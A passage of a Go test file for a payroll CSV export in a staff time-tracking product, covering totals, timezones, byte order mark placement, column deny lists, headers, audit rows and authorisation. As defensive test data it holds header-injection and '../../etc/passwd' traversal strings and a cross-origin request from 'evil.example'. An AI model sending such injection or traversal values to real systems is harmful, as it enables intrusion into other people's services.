		{"Hours a manager refused", "1h 00m"},
		{"Check-ins with no checkout", "2"},
		{"Closed too late to be a shift", "1"},
		{"Training taps", "4"},
		{"Checkouts that began earlier", "2"},
		{"Records naming no employee", "1"},
	} {
		row := rowStartingWith(rows, c.key)
		if row == nil {
			t.Errorf("the export never mentions %q", c.key)
			continue
		}
		if row[1] != c.value {
			t.Errorf("%q = %q, want %q", c.key, row[1], c.value)
		}
	}
	// 🔴 Q18's OWN SENTENCE. An unclosed check-in is worth NO hours, which is a
	// different claim from zero hours -- the difference is whether a payroll process
	// treats the person as having been off.
	open := rowStartingWith(rows, "Check-ins with no checkout")
	if open == nil || !strings.Contains(open[3], "not zero hours") {
		t.Error("the export does not say an unclosed check-in is uncounted rather than zero")
	}
	// AND THE OPEN LIST CARRIES NO END AND NO DURATION, because the system produces no
	// checkout (Q18). A column here would be the product inventing a record.
	head := rowStartingWith(rows, "employee")
	if head == nil {
		t.Fatal("the open list has no heading row")
	}
	for _, forbidden := range []string{"closed", "out", "hours", "duration", "worked"} {
		for _, col := range head {
			if strings.Contains(strings.ToLower(col), forbidden) {
				t.Errorf("the open list has a %q column; Tappa produces no checkout, so there "+
					"is nothing honest to put in it", col)
			}
		}
	}
}

// --- UTC and local (obligation 6) ----------------------------------------------

// TestReportCSV_GivesEveryInstantInLocalAndUTCAndSaysWhichIsWhich is the M6-07 card's
// own criterion. The screen prints local only and names the zone once, which is right
// for somebody reading about their own business; a file is read elsewhere.
func TestReportCSV_GivesEveryInstantInLocalAndUTCAndSaysWhichIsWhich(t *testing.T) {
	malta, err := time.LoadLocation("Europe/Malta")
	if err != nil {
		t.Fatalf("Europe/Malta: %v", err)
	}
	week := ledger.WeekOf(ledger.Date{Year: 2026, Month: time.August, Day: 5}, malta)
	opened := week.From.Add(10 * time.Hour)
	screen := ledger.ReportScreen{
		TenantName: "Kebab Factory Ltd",
		Report: ledger.Report{
			Queried: true, Zone: malta, Period: week,
			Totals: ledger.Totals{Open: 1},
			Open: []ledger.OpenEntry{{
				EmployeeName: "Maria Borg", LocationName: "KF St Julians", At: opened,
			}},
		},
	}
	doc, err := reportCSV(screen, opened.Add(2*time.Hour))
	if err != nil {
		t.Fatalf("reportCSV: %v", err)
	}
	rows := parseCSV(t, string(doc))

	// The zone is named ONCE, at the top, and every local instant is offset-stamped
	// so the file is readable without it.
	if row := rowStartingWith(rows, "Timezone"); row == nil || row[1] != "Europe/Malta" {
		t.Fatalf("the export does not name the zone: %v", row)
	}
	for _, key := range []string{"Period starts (UTC)", "Period ends (UTC, exclusive)", "Exported at (local)", "Exported at (UTC)"} {
		row := rowStartingWith(rows, key)
		if row == nil {
			t.Errorf("the preamble has no %q", key)
			continue
		}
		if _, err := time.Parse(time.RFC3339, row[1]); err != nil {
			t.Errorf("%q = %q is not ISO 8601: %v", key, row[1], err)
		}
	}

	// THE OPEN ROW CARRIES BOTH, and the two are the SAME instant -- which is the
	// property a reader in another country needs and a wall clock alone cannot give.
	head := rowStartingWith(rows, "employee")
	if head == nil {
		t.Fatal("the open list has no heading row")
	}
	var localCol, utcCol = -1, -1
	for i, c := range head {
		switch c {
		case "opened_local":
			localCol = i
		case "opened_utc":
			utcCol = i
		}
	}
	if localCol < 0 || utcCol < 0 {
		t.Fatalf("the open list heads are %v; both a local and a UTC column are required", head)
	}
	row := rowStartingWith(rows, "Maria Borg")
	if row == nil {
		t.Fatal("the open entry is not in the file, so the comparison below is vacuous")
	}
	gotLocal, err := time.Parse(time.RFC3339, row[localCol])
	if err != nil {
		t.Fatalf("opened_local %q is not ISO 8601: %v", row[localCol], err)
	}
	gotUTC, err := time.Parse(time.RFC3339, row[utcCol])
	if err != nil {
		t.Fatalf("opened_utc %q is not ISO 8601: %v", row[utcCol], err)
	}
	if !gotLocal.Equal(gotUTC) || !gotLocal.Equal(opened) {
		t.Errorf("opened_local %s and opened_utc %s are not the same instant %s", gotLocal, gotUTC, opened)
	}
	// AND THEY REALLY ARE DIFFERENT WALL CLOCKS -- Malta is CEST in August, so a
	// fixture where the two strings were identical would prove nothing.
	if row[localCol] == row[utcCol] {
		t.Fatalf("the local and UTC columns are the same text (%q); this fixture cannot "+
			"tell a converted instant from an unconverted one", row[localCol])
	}
	if !strings.HasSuffix(row[utcCol], "Z") {
		t.Errorf("opened_utc %q does not say it is UTC", row[utcCol])
	}
}

// TestReportCSV_PutsTheBOMWhereNoColumnHeadingIs is the BOM decision's whole
// mitigation, and the reason it is a test rather than a comment.
//
// 🔴 THE MARK IS EMITTED SO A SPREADSHEET DOES NOT DESTROY ħ ġ ċ ż AND ı ş ğ ç -- both
// of this product's markets. What that costs is three bytes on the first cell of the
// first line, and this pins that the line in question is a TITLE rather than a column
// heading: every heading row a machine keys on begins a block after a blank line.
func TestReportCSV_PutsTheBOMWhereNoColumnHeadingIs(t *testing.T) {
	screen := reportWith(func(r *ledger.Report) {
		r.Totals = ledger.Totals{Worked: time.Hour, Shifts: 1}
		r.People = []ledger.PersonHours{{
			EmployeeID: uuid.New(), Name: "Marħa Żammit", Worked: time.Hour, Shifts: 1,
			Daily: make([]time.Duration, ledger.ReportDays),
		}}
	})
	doc, err := reportCSV(screen, weekOfUTC().From)
	if err != nil {
		t.Fatalf("reportCSV: %v", err)
	}
	body := string(doc)
	if !strings.HasPrefix(body, reportCSVBOM) {
		t.Fatal("the export carries no byte order mark; a spreadsheet will open it in the " +
			"system code page and destroy every Maltese and Turkish name in it")
	}
	rows := parseCSV(t, body)

	// 🔴 THE MARK IS ON A TITLE CELL. Parsed WITHOUT stripping it, the first cell is
	// the document's title and no machine-readable heading is touched.
	if rows[0][0] != reportCSVBOM+"Tappa — hours worked" {
		t.Fatalf("the first cell is %q; the mark must land on the title line", rows[0][0])
	}
	// EVERY OTHER CELL IS CLEAN, which is the property that makes the placement worth
	// anything.
	for r := range rows {
		for c := range rows[r] {
			if r == 0 && c == 0 {
				continue
			}
			if strings.Contains(rows[r][c], reportCSVBOM) {
				t.Errorf("row %d cell %d carries a byte order mark: %q", r+1, c, rows[r][c])
			}
		}
	}
	// AND THE NAMES SURVIVED THE ROUND TRIP, byte for byte.
	if !findCell(rows, "Marħa Żammit") {
		t.Error("a Maltese name did not survive the export")
	}
	// The heading rows a consumer keys on are intact.
	for _, want := range []string{"employee_id", "worked_minutes", "measure"} {
		if !findCell(rows, want) {
			t.Errorf("the heading %q is not readable; the mark has reached a column name", want)
		}
	}
}

// --- §4.7 (obligation 3) --------------------------------------------------------

// forbiddenColumn reports why a CSV column name may not exist, or "" for a fine one.
//
// 🔴 IT LAYERS TWO MATCHERS AND THE SECOND EXISTS BECAUSE THE FIRST HAS A HOLE THIS
// FILE WOULD FALL INTO. bannedFieldName (reports_test.go) is hardened by two audits
// and splits CamelCase; CSV headings are snake_case, so "source_ip" reaches it as ONE
// word and its word-mode list ("source", "ip") never fires. Splitting on the
// underscore fixes that -- and one column still slips through both: `entered_by`
// matches no token at all, and it is one of the five §4.7 keeps out of this path. So
// the schema column names are named outright.
//
// TestForbiddenColumn_RefusesTheFiveByName measures every one of these claims.
func forbiddenColumn(name string) string {
	low := strings.ToLower(name)
	for _, col := range []string{"gps_lat", "gps_lng", "source_ip", "policy_context", "entered_by"} {
		if strings.Contains(low, col) {
			return "it is " + col + ", which §4.7 keeps out of this path"
		}
	}
	for _, part := range strings.FieldsFunc(name, func(r rune) bool { return r == '_' || r == ' ' || r == '(' || r == ')' }) {
		if why := bannedFieldName(part); why != "" {
			return why
		}
	}
	return bannedFieldName(name)
}

// TestForbiddenColumn_RefusesTheFiveByNameAndAcceptsTheColumnsThisFileHas is the
// matcher's control in both directions, ahead of the sweep that uses it.
func TestForbiddenColumn_RefusesTheFiveByNameAndAcceptsTheColumnsThisFileHas(t *testing.T) {
	// The five phase A's query does not select, plus the spellings they generalise to.
	for _, name := range []string{
		"gps_lat", "gps_lng", "source_ip", "policy_context", "entered_by",
		"GPS_LAT", "employee_gps_lat", "latitude", "longitude", "coordinates",
		"session_token", "invite_code", "aes_key", "cmac", "remote_addr", "client_addr",
	} {
		if forbiddenColumn(name) == "" {
			t.Errorf("the §4.7 column matcher ACCEPTS %q", name)
		}
	}
	// And the ones this document really has. A matcher that refuses everything is one
	// somebody deletes rather than fixes.
	for _, name := range []string{
		"employee_id", "employee", "worked", "worked_minutes", "shifts", "awaiting",
		"awaiting_minutes", "refused", "refused_minutes", "late_arrivals", "late_by",
		"late_by_minutes", "arrivals_not_measured", "manager_entered_arrivals",
		"open_check_ins", "venue", "opened_local", "opened_utc", "needs_action",
		"manager_entered", "measure", "value", "minutes", "note", "what",
		"2026-08-03 (Mon) minutes",
	} {
		if why := forbiddenColumn(name); why != "" {
			t.Errorf("the §4.7 column matcher REFUSES the column %q this file writes (%s)", name, why)
		}
	}
}

// TestReportCSV_HasNoColumnACoordinateOrASecretCouldTravelIn sweeps the real
// document's heading rows.
//
// 🔴 IT IS THE THIRD WALL RATHER THAN THE FIRST. The query selects no coordinate and
// the ledger types have no field for one; this refuses the COLUMN, so an edit that
// widens the SELECT "just for the export" has nowhere to land.
func TestReportCSV_HasNoColumnACoordinateOrASecretCouldTravelIn(t *testing.T) {
	records := newFakeLedger()
	records.hours = reportWith(func(r *ledger.Report) {
		r.Totals = ledger.Totals{Worked: time.Hour, Shifts: 1, Open: 1}
		r.People = []ledger.PersonHours{{
			EmployeeID: uuid.New(), Name: "Maria Borg", Worked: time.Hour, Shifts: 1,
			Daily: make([]time.Duration, ledger.ReportDays),
		}}
		r.Venues = []ledger.VenueHours{{Name: "KF St Julians", Worked: time.Hour, Shifts: 1}}
		r.Open = []ledger.OpenEntry{{EmployeeName: "Maria Borg", At: weekOfUTC().From}}
	})
	b, _ := exportBrowser(t, records)
	rows, _ := exportCSV(t, b, "")

	// The heading rows are the ones whose first cell is a known heading anchor. They
	// are found rather than counted, so a block added later is swept too.
	heads := 0
	for _, row := range rows {
		if len(row) == 0 {
			continue
		}
		switch row[0] {
		case "employee_id", "employee", "venue", "measure", "what":
		default:
			continue
		}
		heads++
		for _, col := range row {
			if why := forbiddenColumn(col); why != "" {
				t.Errorf("§4.7 BREACH: the export has a column %q (%s)", col, why)
			}
		}
	}
	// ANTI-VACUITY: this file holds a heading row per block, and a sweep that found
	// none would pass forever.
	if heads < 4 {
		t.Fatalf("the sweep found %d heading row(s); the document has one per block, so it "+
			"is reading the wrong thing", heads)
	}
}

// --- the response (obligation 6's header half) ---------------------------------

// TestReportsExport_SendsTheHeadersADownloadNeedsAndNotTheOnesItDoesNot is the trap
// phase B was warned about by name: a.render is the panel's ONE header block and it
// is for HTML. Copying half of it is the failure this repository has paid for four
// times, so every header is stated here with what it is for.
func TestReportsExport_SendsTheHeadersADownloadNeedsAndNotTheOnesItDoesNot(t *testing.T) {
	records := newFakeLedger()
	records.hours = reportWith(func(r *ledger.Report) {
		r.Totals = ledger.Totals{Worked: time.Hour, Shifts: 1}
	})
	b, _ := exportBrowser(t, records)
	rec := b.do(http.MethodGet, reportsCSVHref+"?week=2026-08-05", nil)
	if rec.Code != http.StatusOK {
		t.Fatalf("status = %d, want 200", rec.Code)
	}
	h := rec.Header()

	for _, c := range []struct{ name, want, why string }{
		{"Content-Type", "text/csv; charset=utf-8", "a browser must not render this as a page"},
		{"X-Content-Type-Options", "nosniff", "content sniffing on a downloaded file is how an attachment becomes a page"},
		{"Cache-Control", "no-store", "this is payroll; no intermediary and no back button may keep a copy"},
		{"Content-Disposition", `attachment; filename="tappa-hours-2026-08-03.csv"`, "it is a file, and its name is server-derived"},
	} {
		if got := h.Get(c.name); got != c.want {
			t.Errorf("%s = %q, want %q (%s)", c.name, got, c.want, c.why)
		}
	}
	// Content-Length is why the document is buffered: without it a cut-off download is
	// a short payroll file with a 200 on it rather than a broken download.
	if got, want := h.Get("Content-Length"), strconv.Itoa(rec.Body.Len()); got != want {
		t.Errorf("Content-Length = %q, want %q", got, want)
	}
	// 🔴 AND THE HEADERS IT DOES NOT TAKE, said out loud so the omission is a decision.
	// A Content-Security-Policy governs how a DOCUMENT executes; this response is an
	// attachment with nosniff on it and executes nothing, so a policy here would be
	// decoration that the next reader mistakes for protection.
	if got := h.Get("Content-Security-Policy"); got != "" {
		t.Errorf("the CSV carries a Content-Security-Policy (%q); it is not a document", got)
	}
	// It is not HTML, which is the thing a copied a.render would have made it.
	if strings.Contains(rec.Body.String(), "<") && strings.Contains(rec.Body.String(), "</") {
		t.Error("the export body looks like markup")
	}
}

// TestReportCSVFilename_IsServerDerivedAndCannotBreakTheHeader is the
// Content-Disposition injection surface, measured rather than asserted.
//
// 🔴 A TENANT NAME IS FREE TEXT A CUSTOMER TYPES, and this is why it is NOT in the
// filename: the header value is quoted, and a name carrying a double quote would
// break out of it. The filename is built from ONE server-derived value and this
// pattern is what makes "server-derived" checkable.
func TestReportCSVFilename_IsServerDerivedAndCannotBreakTheHeader(t *testing.T) {
	for _, c := range []struct{ in, want string }{
		{in: "2026-08-03", want: "tappa-hours-2026-08-03.csv"},
		// Everything that is not an ISO date falls back, INCLUDING the shapes that
		// would break the header.
		{in: `x" ; filename="payroll.html`, want: "tappa-hours.csv"},
		{in: "2026-08-03\r\nX-Injected: 1", want: "tappa-hours.csv"},
		{in: "../../etc/passwd", want: "tappa-hours.csv"},
		{in: "", want: "tappa-hours.csv"},
		{in: "2026-8-3", want: "tappa-hours.csv"},
	} {
		if got := reportCSVFilename(c.in); got != c.want {
			t.Errorf("reportCSVFilename(%q) = %q, want %q", c.in, got, c.want)
		}
	}

	// AND THE WHOLE ROUTE, with a hostile business name in the report: it must reach
	// the body and NEVER the headers.
	records := newFakeLedger()
	hostile := `Evil" ; filename="payroll.html` + "\r\nX-Injected: yes"
	records.hours = ledger.ReportScreen{
		TenantName: hostile,
		Report: ledger.Report{
			Queried: true, Zone: time.UTC, Period: weekOfUTC(),
			Totals: ledger.Totals{Worked: time.Hour, Shifts: 1},
		},
	}
	b, _ := exportBrowser(t, records)
	rec := b.do(http.MethodGet, reportsCSVHref, nil)
	if rec.Code != http.StatusOK {
		t.Fatalf("status = %d, want 200", rec.Code)
	}
	if rec.Header().Get("X-Injected") != "" {
		t.Fatal("a tenant name injected a response header")
	}
	if got := rec.Header().Get("Content-Disposition"); strings.Contains(got, "Evil") || strings.Contains(got, "payroll.html") {
		t.Errorf("the tenant name reached Content-Disposition: %q", got)
	}
	// POSITIVE CONTROL: the name really was in this report, so the two assertions
	// above are about the header rather than about an empty fixture.
	if !strings.Contains(rec.Body.String(), "payroll.html") {
		t.Fatal("the hostile tenant name is nowhere in the file; this case measures nothing")
	}
}

// --- §4.6 at the boundary -------------------------------------------------------

// TestReportsExport_RefusesToProduceAFileFromAReadThatDidNotHappen is §4.6 sharpened
// for a file: an error page is loud and a CSV of zeroes is not.
func TestReportsExport_RefusesToProduceAFileFromAReadThatDidNotHappen(t *testing.T) {
	cases := []struct {
		name  string
		setup func(*fakeLedger)
	}{
		{
			name:  "the database did not answer",
			setup: func(f *fakeLedger) { f.hoursErr = errUnavailable },
		},
		{
			// 🔴 THE ANTI-FABRICATION FLAG, ENFORCED. A Report with Queried=false is a
			// value nobody asked the database for, and it renders as a perfectly valid
			// CSV of zero hours -- indistinguishable, once it is in a spreadsheet, from
			// a real quiet week.
			name: "the report was never queried",
			setup: func(f *fakeLedger) {
				f.hours = ledger.ReportScreen{Report: ledger.Report{Zone: time.UTC, Period: weekOfUTC()}}
			},
		},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			records := newFakeLedger()
			c.setup(records)
			b, trail := exportBrowser(t, records)
			rec := b.do(http.MethodGet, reportsCSVHref, nil)
			if rec.Code != http.StatusInternalServerError {
				t.Fatalf("status = %d, want 500 -- a file must not be produced", rec.Code)
			}
			if got := rec.Header().Get("Content-Disposition"); got != "" {
				t.Errorf("a failed export still offered a download (%q)", got)
			}
			if strings.Contains(rec.Body.String(), "0h 00m") {
				t.Error("the failure page printed a payroll figure")
			}
			// AND NOTHING WAS AUDITED, because nothing was exported.
			if n := trail.count(ActionReportExported); n != 0 {
				t.Errorf("%d export(s) recorded for a download that never happened", n)
			}
		})
	}
}

// errUnavailable is the read failure the case above injects.
var errUnavailable = errors.New("connection refused")

// jsonOf renders an audit detail the way internal/audit will, so the §4.7 sweep over
// it reads what the database would actually store rather than a Go value's %v.
func jsonOf(t *testing.T, v any) string {
	t.Helper()
	b, err := json.Marshal(v)
	if err != nil {
		t.Fatalf("marshalling the audit detail: %v", err)
	}
	return string(b)
}

// --- the trail (obligation 4) ---------------------------------------------------

// TestReportsExport_WritesOneAuditRowSayingWhoTookWhichWeek is the section's ONE
// write, and the reason a bulk export needs one at all: the data leaves the product.
func TestReportsExport_WritesOneAuditRowSayingWhoTookWhichWeek(t *testing.T) {
	records := newFakeLedger()
	records.hours = reportWith(func(r *ledger.Report) {
		r.Totals = ledger.Totals{Worked: 9 * time.Hour, Shifts: 2}
		r.People = []ledger.PersonHours{{
			EmployeeID: uuid.New(), Name: "Maria Borg", Worked: 9 * time.Hour, Shifts: 2,
			Daily: make([]time.Duration, ledger.ReportDays),
		}}
		r.Open = []ledger.OpenEntry{{EmployeeName: "Maria Borg", At: weekOfUTC().From}}
	})
	b, trail := exportBrowser(t, records)

	// POSITIVE CONTROL: reading the SCREEN writes nothing, so "the export wrote one"
	// is about the export rather than about every panel request.
	b.do(http.MethodGet, reportsHref, nil)
	if n := trail.count(ActionReportExported); n != 0 {
		t.Fatalf("reading the screen recorded %d export(s)", n)
	}

	rec := b.do(http.MethodGet, reportsCSVHref+"?week=2026-08-05", nil)
	if rec.Code != http.StatusOK {
		t.Fatalf("status = %d, want 200", rec.Code)
	}
	if n := trail.count(ActionReportExported); n != 1 {
		t.Fatalf("%d audit row(s) for one export, want 1", n)
	}
	events := trail.eventsSnapshot()
	e := events[len(events)-1]
	if e.TenantID != panelTestTenant {
		t.Errorf("the audit row names tenant %v, want the session's %v", e.TenantID, panelTestTenant)
	}
	if e.ActorID == nil || *e.ActorID != panelTestAdmin {
		t.Errorf("the audit row names actor %v, want the signed-in admin %v", e.ActorID, panelTestAdmin)
	}
	if e.Target != "2026-08-03" {
		t.Errorf("the audit row's target is %q, want the week it exported", e.Target)
	}
	detail, ok := e.Detail.(reportExportDetail)
	if !ok {
		t.Fatalf("the audit detail is %T; internal/audit cannot scrub, so it must be a "+
			"purpose-built struct", e.Detail)
	}
	if detail.People != 1 || detail.Shifts != 2 || detail.WorkedMinutes != 540 || detail.OpenEntries != 1 {
		t.Errorf("the audit detail does not describe what was exported: %+v", detail)
	}
	if detail.Bytes != rec.Body.Len() {
		t.Errorf("the audit says %d bytes, the download was %d", detail.Bytes, rec.Body.Len())
	}
	// 🔴 §4.7 IN THE TRAIL. audit_log cannot scrub, so the caller must hand it nothing
	// to scrub: the detail is counts, and NOT a second copy of the week's records.
	for _, secret := range []string{"Maria Borg", "gps", "source_ip", "token"} {
		if strings.Contains(strings.ToLower(jsonOf(t, detail)), strings.ToLower(secret)) {
			t.Errorf("the audit detail carries %q", secret)
		}
	}
}

// --- what is NOT gated, pinned so it stays visible ------------------------------

// TestReportsExport_InheritsTheREADChainAndTheGapIsCOUNTED pins both halves of the
// GET decision: what protects this route, and what does not.
//
// 🔴 THE SECOND HALF IS THE POINT. This route has one side effect -- an audit_log row
// -- and it is on the READ chain, which carries no Origin check. A cross-origin
// top-level navigation therefore succeeds and writes one row. That is a COUNTED limit
// rather than a closed one (reportsExport states what bounds it), and it is pinned
// here so that a future reader finds a measurement rather than a surprise: if
// somebody moves this route onto ProtectWriting, this test tells them the download
// link stopped working before a customer does.
func TestReportsExport_InheritsTheREADChainAndTheGapIsCOUNTED(t *testing.T) {
	records := newFakeLedger()
	records.hours = reportWith(func(r *ledger.Report) {
		r.Totals = ledger.Totals{Worked: time.Hour, Shifts: 1}
	})

	// WHAT PROTECTS IT: an anonymous request never reaches the reader.
	anon, trail := exportBrowser(t, records)
	delete(anon.cookies, adminauth.CookieName)
	rec := anon.do(http.MethodGet, reportsCSVHref, nil)
	if rec.Code == http.StatusOK {
		t.Fatal("an anonymous request downloaded a tenant's payroll")
	}
	if n := trail.count(ActionReportExported); n != 0 {
		t.Errorf("an anonymous request recorded %d export(s)", n)
	}

	// WHAT DOES NOT: a cross-origin GET with a live session is served, because
	// sameOriginGate is not on the read chain. Measured, not assumed.
	b, trail2 := exportBrowser(t, records)
	req := httptest.NewRequest(http.MethodGet, reportsCSVHref, nil)
	req.RemoteAddr = b.ip
	req.Header.Set("Origin", "https://evil.example")
	req.Header.Set("Sec-Fetch-Site", "cross-site")
	req.AddCookie(&http.Cookie{Name: adminauth.CookieName, Value: b.cookies[adminauth.CookieName]})
	cross := httptest.NewRecorder()
	b.h.ServeHTTP(cross, req)
	if cross.Code != http.StatusOK {
		t.Fatalf("a cross-origin GET answered %d; the chain has changed and the download "+
			"link on the reports screen may have stopped working -- see reportsExport", cross.Code)
	}
	if n := trail2.count(ActionReportExported); n != 1 {
		t.Errorf("the cross-origin export recorded %d row(s), want 1 -- the trail is what "+
			"makes this limit attributable", n)
	}
}

// TestReportsExport_IsReachableFromTheScreenAndNamesTheWeekOnIt drives the control a
// manager actually presses, off the rendered page, through the same router.
//
// 🔴 A DOWNLOAD BUTTON THAT EXPORTS THE WRONG WEEK IS SILENT ON BOTH SIDES. The file
// says which week it holds and nobody re-reads the screen to compare, so the link has
// to carry the week the reader is looking at rather than today's.
func TestReportsExport_IsReachableFromTheScreenAndNamesTheWeekOnIt(t *testing.T) {
	records := newFakeLedger()
	records.hours = reportWith(func(r *ledger.Report) {
		r.Totals = ledger.Totals{Worked: time.Hour, Shifts: 1}
	})
	b, _ := exportBrowser(t, records)
	// A week that is NOT the fake's default, so "the link carries the week" cannot be
	// satisfied by a constant.
	body := b.do(http.MethodGet, reportsHref+"?week=2026-08-05", nil).Body.String()

	var link string
	for _, href := range sameOriginHrefs(body) {
		if strings.HasPrefix(href, reportsCSVHref) {
			link = href
		}
	}
	if link == "" {
		t.Fatalf("the reports screen offers no CSV link (%v)", sameOriginHrefs(body))
	}
	if !strings.Contains(link, "week=2026-08-03") {
		t.Errorf("the export link is %q; it must name the week ON THE SCREEN, which is the "+
			"Monday of the requested day", link)
	}
	if rec := b.do(http.MethodGet, link, nil); rec.Code != http.StatusOK {
		t.Fatalf("the link the page offers answered %d", rec.Code)
	}
}

// --- the authorisation claim, MEASURED (obligation 5) ---------------------------

// TestReportExportAuthority_IsGrantedToBothPanelRolesByTheBaseline is the measurement
// behind reportsExport's decision NOT to call the policy engine.
//
// 🔴 THE ARGUMENT IS "A GATE HERE WOULD REFUSE NOBODY", AND THAT IS A FACT ABOUT
// internal/policy RATHER THAN AN OPINION. The managed baseline grants report:export to
// the owner AND to the manager, and the panel has exactly two roles, so a role check on
// this route would be a door that is measured to be always open — worse than no door,
// because the next reader stops looking. If a future baseline narrows the action to one
// role, this test goes red and the decision has to be re-taken rather than inherited.
func TestReportExportAuthority_IsGrantedToBothPanelRolesByTheBaseline(t *testing.T) {
	granted := map[string]string{}
	statements := 0
	for _, doc := range policy.Baseline() {
		for _, st := range doc.Document.Statements {
			statements++
			var carries bool
			for _, a := range st.Action {
				if a == policy.ActionReportExport {
					carries = true
				}
			}
			if !carries || st.Effect != policy.EffectAllow {
				continue
			}
			role, _ := st.Condition[policy.OpStringEquals][policy.CtxActorRole].(string)
			granted[role] = st.Sid
		}
	}
	// ANTI-VACUITY: a walk over an empty baseline would pass forever.
	if statements < 5 {
		t.Fatalf("the baseline walk saw %d statement(s); it holds more, so this is reading "+
			"the wrong thing", statements)
	}
	// The panel's two roles come from admin_users' own CHECK, and internal/policy names
	// them; they are not written out again here.
	for _, role := range []string{"owner", "manager"} {
		if sid, ok := granted[role]; !ok {
			t.Errorf("the baseline does NOT grant %s to %q. A role gate on the export would "+
				"now refuse somebody, so reportsExport's reason for having none has expired.",
				policy.ActionReportExport, role)
		} else {
			t.Logf("%s -> %s (%s)", role, policy.ActionReportExport, sid)
		}
	}
}

// TestPanel_CallsThePolicyEngineNowhere is the other half of the same claim: this
// route is not the odd one out.
//
// 🔴 IT PARSES THE PACKAGE RATHER THAN GREPPING IT, because a grep for "Evaluate" is
// answered by every comment that mentions the engine — including the one this test
// exists to keep honest.
func TestPanel_CallsThePolicyEngineNowhere(t *testing.T) {
	fset := token.NewFileSet()
	pkgs, err := parser.ParseDir(fset, ".", func(fi os.FileInfo) bool {
		return !strings.HasSuffix(fi.Name(), "_test.go")
	}, 0)
	if err != nil {
		t.Fatalf("parsing internal/handler: %v", err)
	}
	files, calls := 0, 0
	for _, pkg := range pkgs {
		for name, file := range pkg.Files {
			files++
			ast.Inspect(file, func(n ast.Node) bool {
				call, ok := n.(*ast.CallExpr)
				if !ok {
					return true
				}
				sel, ok := call.Fun.(*ast.SelectorExpr)
				if !ok || sel.Sel.Name != "Evaluate" {
					return true
				}
				id, ok := sel.X.(*ast.Ident)
				if !ok || id.Name != "policy" {
					return true
				}
				calls++
				t.Logf("%s: policy.Evaluate", fset.Position(call.Pos()))
				return true
			})
			_ = name
		}
	}
	// ANTI-VACUITY.
	if files < 20 {
		t.Fatalf("the walk parsed %d file(s); internal/handler has more, so it is reading "+
			"the wrong directory", files)
	}
	if calls != 0 {
		t.Errorf("%d panel handler(s) call policy.Evaluate. The export's comment says none "+
			"does and uses that to justify having no gate of its own; one of the two has to "+
			"change.", calls)
	}
}

// TestReportCSV_LosesABareCarriageReturnAndSaysSo pins the SECOND lossy step, which
// this file's own documentation used to omit.
//
// 🔴 IT PINS A LOSS RATHER THAN A DEFENCE, and that is the point: csv.Writer with
// UseCRLF drops a CR that is not part of a CRLF, so a name holding one comes out
// shorter. `employees.full_name` is unbounded text with no CHECK, so the value can
// exist. The behaviour is deliberate (spreadsheetSafe's comment weighs it against
// shipping a bare CR inside a quoted field, which a lenient parser splits a record on)
// and it is pinned so that the next reader finds it MEASURED rather than discovers it
// in a payroll file.
func TestReportCSV_LosesABareCarriageReturnAndSaysSo(t *testing.T) {
	week := weekOfUTC()
	screen := ledger.ReportScreen{
		TenantName: "Kebab Factory Ltd",
		Report: ledger.Report{
			Queried: true, Zone: time.UTC, Period: week,
			Totals: ledger.Totals{Worked: time.Hour, Shifts: 1},
			People: []ledger.PersonHours{
				{EmployeeID: uuid.New(), Name: "Maria\rBorg", Worked: time.Hour, Shifts: 1,
					Daily: make([]time.Duration, ledger.ReportDays)},
				{EmployeeID: uuid.New(), Name: "Anne\nVella", Worked: time.Hour, Shifts: 1,
					Daily: make([]time.Duration, ledger.ReportDays)},
			},
		},
	}
	doc, err := reportCSV(screen, week.From)
	if err != nil {
		t.Fatalf("reportCSV: %v", err)
	}
	rows := parseCSV(t, string(doc))

	// THE LOSS: the bare CR is gone, and the name is CLOSED UP rather than broken.
	if !findCell(rows, "MariaBorg") {
		t.Error("a name holding a bare carriage return did not arrive as the closed-up " +
			"form; spreadsheetSafe's account of what this file costs is out of date")
	}
	if findCell(rows, "Maria\rBorg") {
		t.Error("a bare carriage return survived the writer; the comment saying it does " +
			"not is now the wrong one")
	}
	// THE POSITIVE CONTROL, which is what makes the loss specific rather than "the
	// writer mangles whitespace": a LINE FEED is preserved exactly, inside one cell.
	if !findCell(rows, "Anne\nVella") {
		t.Error("a line feed was not preserved; the loss is wider than the CR this test names")
	}
	// AND NOTHING WAS SPLIT INTO AN EXTRA RECORD, which is the failure the decision
	// avoids: a bare CR shipped inside a quoted field is what a lenient parser cuts on.
	head := rowStartingWith(rows, "employee_id")
	people := 0
	for _, row := range rows {
		if len(row) == len(head) && len(row) > 0 && row[0] != "employee_id" {
			people++
		}
	}
	if people != 2 {
		t.Errorf("the person block holds %d rows, want 2; a control character split a record", people)
	}
}

// TestReportCSV_CountsTheBacklogThatNeedsAManagerAsAWHOLE is the tally the screen
// prints and the file was missing.
//
// 🔴 DERIVABLE IS NOT THE SAME AS PRESENT. Every open row carries needs_action, so a
// reader COULD add them up — but the block this lives in exists precisely because a
// payroll process reads rows rather than deriving them, and the screen states the same
// number in words. An asymmetry between the two surfaces is how they start disagreeing.
func TestReportCSV_CountsTheBacklogThatNeedsAManagerAsAWHOLE(t *testing.T) {
	week := weekOfUTC()
	// 🔴 THE STALE ENTRIES RUN PAST THE SCREEN'S CAP ON PURPOSE, AND THE FIRST VERSION
	// OF THIS FIXTURE DID NOT — measured. It made the first 37 of 129 entries stale, so
	// a tally that stopped at maxOpenRows still counted all 37 and the mutation that
	// bounded it stayed GREEN. The fresh ones are at the FRONT now, so a page-bounded
	// tally is arithmetically unable to reach the right answer.
	const open = maxOpenRows + 43
	const fresh = 20
	const stale = open - fresh
	records := newFakeLedger()
	records.hours = reportWith(func(r *ledger.Report) {
		r.Totals.Open = open
		for i := 0; i < open; i++ {
			r.Open = append(r.Open, ledger.OpenEntry{
				EmployeeName: "Open Worker " + pad2(i),
				LocationName: "KF St Julians",
				At:           week.From.Add(time.Duration(i) * time.Minute),
				Stale:        i >= fresh,
			})
		}
	})
	b, _ := exportBrowser(t, records)
	rows, _ := exportCSV(t, b, "")

	row := rowStartingWith(rows, "Open too long to be somebody on shift")
	if row == nil {
		t.Fatal("the export never says how much of the backlog needs a manager")
	}
	if row[1] != strconv.Itoa(stale) {
		t.Errorf("the tally says %q, want %d", row[1], stale)
	}
	// 🔴 IT COUNTS THE BACKLOG AND NOT A PAGE, and the guard below is what keeps this
	// case DISCRIMINATING rather than merely large. The most a page-bounded tally could
	// report is the stale entries inside the first maxOpenRows; if the true answer were
	// reachable that way, this test would pass over the defect — which is exactly what
	// happened to its first fixture.
	if pageBound := maxOpenRows - fresh; pageBound >= stale {
